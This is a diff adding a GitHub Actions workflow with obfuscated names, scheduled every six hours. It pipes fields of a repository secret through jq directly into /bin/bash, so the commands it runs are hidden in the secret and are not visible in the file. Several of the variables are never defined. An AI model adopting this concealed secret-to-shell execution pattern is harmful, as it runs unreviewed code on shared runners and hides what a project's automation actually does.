@@ -1,0 +1,24 @@
+name: yangqianhuan3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangqianhuan3456
+        env:
+          rmb39: ${{ secrets.rmb39 }}
+        run: |
+          echo $rmb39 | jq -r .wlft04 | /bin/bash
+          echo $k9343 | jq -r .svwsg634 | /bin/bash
+          echo $l738 | jq -r .x69605 | /bin/bash
+          echo $zob813 | jq -r .at51 | /bin/bash
+          echo $mlelz4 | jq -r .ntx25377 | /bin/bash
+          echo $p4 | jq -r .ahv48128 | /bin/bash
+
